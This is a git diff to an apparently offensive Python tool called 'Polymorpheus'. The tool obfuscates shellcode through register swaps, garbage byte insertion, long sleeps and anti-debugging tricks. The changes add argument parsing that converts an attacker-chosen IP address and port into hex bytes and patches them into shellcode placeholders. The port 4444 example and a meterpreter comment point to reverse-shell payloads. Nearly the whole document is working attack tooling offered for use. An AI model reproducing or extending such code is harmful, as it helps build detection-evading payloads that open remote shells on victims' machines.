@@ -15,6 +15,7 @@ import sys
 from random import randint #Temporary
 
 def print_help():
+    print("Polymorpheus\n")
     print("Syntax:")
     #print("-s: Register Swap (\x1b[4mEXPERIMENTAL\x1b[0m)")
     #print("-x: Full Register Swap (\x1b[4mLimited to 63 byte, may cause crashes\x1b[0m)")
@@ -23,9 +24,12 @@ def print_help():
     print("-g: Garbage byte insertion")
     print("-l: Long sleep")
     print("-a: Anti debugging features")
-    print("-v: Verbose mode")
-    print("\nExample: python3 main.py -rdgl -v\n")
-    print("Shellcode.txt syntax:\nArch(32 or 64)\nShellcode here, with or without \"")
+    print("-v: Verbose mode, must be last argument")
+    print("\nTo specify an IPv4 address to connect to, include IP= as a command-line argument, and use IP as your ip address placeholder in shellcode.txt")
+    print("To specify a port to connect to, include PORT=, use PORT as your port placeholder in shellcode.txt\n")
+    print("Example: python3 main.py -rdgl IP=127.0.0.1 PORT=4444 -v\n")
+    print("Shellcode.txt syntax:\nLine 1: Arch(32 or 64)\nLine 2: Shellcode here, with or without \" or newlines")
+    print("\nThis script only works on 32-bit or 64-bit intel architectures at the moment")
 
 
 def findBetweenEach(string:str, phrase:str) -> list:
@@ -38,6 +42,49 @@ def findBetweenEach(string:str, phrase:str) -> list:
         returnable = [string]
     return returnable
 
+def ipv4_validate(ipv4:str) -> str:
+    ip_str:str = ""
+    try:
+        for i in (lst:=ipv4.split('.')):
+            i_int:int = int(i)
+            if i_int<0 or i_int>255 or len(lst)!=4:
+                raise ValueError
+            ip_str = r'\x'+ "%02x"%i_int + ip_str #Little Endian
+    except ValueError:
+        print("Invalid IPv4 address")
+        exit()
+    return ip_str
+
+def port_validate(port:str) -> str:
+    try:
+        if int(port)<0 or int(port)>65535:
+            raise ValueError
+        port_hex:str = "%04x"%int(port)
+        port_hex:str = r"\x"+port_hex[-2:]+r"\x"+port_hex[0:2]
+    except ValueError:
+        print("Invalid port")
+        exit()
+    return port_hex
+
+def check_ip_args():
+    ip:str = ""
+    port:str = ""
+    for i in sys.argv: #Consider using re
+        if "ip=" in i.lower():
+            ip = i[i.find('=')+1:]
+            ip = ipv4_validate(ip)
+            continue
+        if "port=" in i.lower():
+            port = i[i.find('=')+1:] 
+            port = port_validate(port)
+            continue
+    return ip, port
+
+def set_host_conn(shellcode:str) -> str:
+    ip, port = check_ip_args()
+    shellcode = shellcode.replace("IP", ip)
+    shellcode = shellcode.replace("PORT", port)
+    return shellcode
 
 #Remember to come here if you get an assembly error
 def loadShellcodeFromFile(fileName:str) -> Shellcode: #meterpreter is too large
@@ -56,6 +103,8 @@ def loadShellcodeFromFile(fileName:str) -> Shellcode: #meterpreter is too large
             if(arch==64):
                 is64 = True
             actual_code = actual_code[len(actual_code.split("\n")[0]):]
+            if "IP" in actual_code or "PORT" in actual_code:
+                actual_code = set_host_conn(actual_code)
     except FileNotFoundError:
         print("Shellcode.txt not found, please make one and put it in the local directory")
         exit()
